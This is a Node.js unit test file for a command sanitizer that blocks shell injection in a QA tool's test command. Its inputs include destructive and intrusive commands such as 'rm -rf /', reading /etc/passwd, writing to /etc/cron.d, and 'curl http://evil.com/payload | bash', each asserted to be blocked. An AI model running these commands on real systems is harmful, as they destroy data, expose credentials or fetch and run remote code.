import test from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeCommandForTest } from './local-qa.js';

const FALLBACK = 'npm test';

// ── sanitizeCommand: shell metacharacter injection prevention ─────────────────

test('sanitizeCommand: semicolon injection is blocked', () => {
  assert.equal(sanitizeCommandForTest('npm test; rm -rf /', FALLBACK), FALLBACK);
});

test('sanitizeCommand: pipe injection is blocked', () => {
  assert.equal(sanitizeCommandForTest('npm test | cat /etc/passwd', FALLBACK), FALLBACK);
});

test('sanitizeCommand: ampersand injection is blocked', () => {
  assert.equal(sanitizeCommandForTest('npm test && malicious', FALLBACK), FALLBACK);
});

test('sanitizeCommand: backtick command substitution is blocked', () => {
  assert.equal(sanitizeCommandForTest('npm test `id`', FALLBACK), FALLBACK);
});

test('sanitizeCommand: dollar substitution is blocked', () => {
  assert.equal(sanitizeCommandForTest('npm test $(id)', FALLBACK), FALLBACK);
});

test('sanitizeCommand: redirect injection is blocked', () => {
  assert.equal(sanitizeCommandForTest('npm test > /etc/cron.d/x', FALLBACK), FALLBACK);
  assert.equal(sanitizeCommandForTest('npm test < /dev/random', FALLBACK), FALLBACK);
});

test('sanitizeCommand: backslash escape is blocked', () => {
  assert.equal(sanitizeCommandForTest('npm test\\nid', FALLBACK), FALLBACK);
});

// ── sanitizeCommand: allowlist pass-through ───────────────────────────────────

test('sanitizeCommand: npm test passes through', () => {
  assert.equal(sanitizeCommandForTest('npm test', FALLBACK), 'npm test');
});

test('sanitizeCommand: npm run build passes through', () => {
  assert.equal(sanitizeCommandForTest('npm run build', FALLBACK), 'npm run build');
});

test('sanitizeCommand: npm run custom-script passes through (dynamic pattern)', () => {
  assert.equal(sanitizeCommandForTest('npm run my-custom-script', FALLBACK), 'npm run my-custom-script');
});

test('sanitizeCommand: yarn test passes through', () => {
  assert.equal(sanitizeCommandForTest('yarn test', FALLBACK), 'yarn test');
});

test('sanitizeCommand: pnpm run build passes through', () => {
  assert.equal(sanitizeCommandForTest('pnpm run build', FALLBACK), 'pnpm run build');
});

test('sanitizeCommand: go test ./... passes through', () => {
  assert.equal(sanitizeCommandForTest('go test ./...', FALLBACK), 'go test ./...');
});

test('sanitizeCommand: python -m pytest passes through', () => {
  assert.equal(sanitizeCommandForTest('python -m pytest', FALLBACK), 'python -m pytest');
});

test('sanitizeCommand: unknown command is replaced with fallback', () => {
  assert.equal(sanitizeCommandForTest('curl http://evil.com/payload | bash', FALLBACK), FALLBACK);
  assert.equal(sanitizeCommandForTest('node -e "require(\'child_process\').exec(\'id\')"', FALLBACK), FALLBACK);
});

test('sanitizeCommand: empty string returns fallback', () => {
  assert.equal(sanitizeCommandForTest('', FALLBACK), FALLBACK);
  assert.equal(sanitizeCommandForTest('   ', FALLBACK), FALLBACK);
});

test('sanitizeCommand: trim is applied before validation', () => {
  assert.equal(sanitizeCommandForTest('  npm test  ', FALLBACK), 'npm test');
});
